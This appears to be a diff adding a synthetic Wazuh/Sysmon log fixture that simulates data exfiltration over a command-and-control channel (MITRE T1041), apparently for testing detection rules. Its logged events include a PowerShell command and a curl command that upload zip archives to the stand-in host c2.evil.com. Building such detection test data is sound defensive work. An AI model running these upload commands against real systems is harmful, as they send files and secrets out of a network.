@@ -1,0 +1,179 @@
+{
+  "_metadata": {
+    "attack_id": "T1041",
+    "variation": "001",
+    "name": "Exfiltration Over C2 Channel",
+    "description": "Exfiltrating data over command and control channel",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 3 - Large outbound data transfer",
+      "sequence": 1,
+      "timestamp": "2026-01-30T09:35:00.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 3: Suspicious Outbound Data Transfer",
+          "id": "100100",
+          "mitre": {
+            "id": ["T1041"],
+            "tactic": ["Exfiltration"],
+            "technique": ["Exfiltration Over C2 Channel"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event3", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1700000062.000001",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 09:35:00.000",
+              "processGuid": "{EXFIL-001-0001-000000000001}",
+              "processId": "10400",
+              "image": "C:\\Users\\attacker\\beacon.exe",
+              "user": "CORP\\attacker",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "10.1.0.20",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "55000",
+              "destinationIsIpv6": "false",
+              "destinationIp": "185.220.101.200",
+              "destinationHostname": "c2.evil.com",
+              "destinationPort": "443",
+              "destinationPortName": "https"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - PowerShell uploading files",
+      "sequence": 2,
+      "timestamp": "2026-01-30T09:35:05.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: PowerShell Data Exfiltration",
+          "id": "100100",
+          "mitre": {
+            "id": ["T1041"],
+            "tactic": ["Exfiltration"],
+            "technique": ["Exfiltration Over C2 Channel"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1700000062.000002",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 09:35:05.000",
+              "processGuid": "{EXFIL-001-0001-000000000002}",
+              "processId": "10500",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -c \"$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\exfil.zip')); Invoke-WebRequest -Uri 'http://c2.evil.com/upload' -Method POST -Body $data\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{EXFIL-001-0001-000000000000}",
+              "parentProcessId": "10400",
+              "parentImage": "C:\\Users\\attacker\\beacon.exe",
+              "parentCommandLine": "beacon.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - curl uploading data",
+      "sequence": 3,
+      "timestamp": "2026-01-30T09:35:10.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Curl Data Upload",
+          "id": "100100",
+          "mitre": {
+            "id": ["T1041"],
+            "tactic": ["Exfiltration"],
+            "technique": ["Exfiltration Over C2 Channel"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1700000062.000003",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 09:35:10.000",
+              "processGuid": "{EXFIL-001-0001-000000000003}",
+              "processId": "10600",
+              "image": "C:\\Windows\\System32\\curl.exe",
+              "commandLine": "curl.exe -X POST -F \"file=@C:\\Temp\\secrets.zip\" http://c2.evil.com/upload",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=CURL_HASH_1234567890ABCDEF1234567890ABCDEF123456",
+              "parentProcessGuid": "{EXFIL-001-0001-000000000000}",
+              "parentProcessId": "10400",
+              "parentImage": "C:\\Users\\attacker\\beacon.exe",
+              "parentCommandLine": "beacon.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
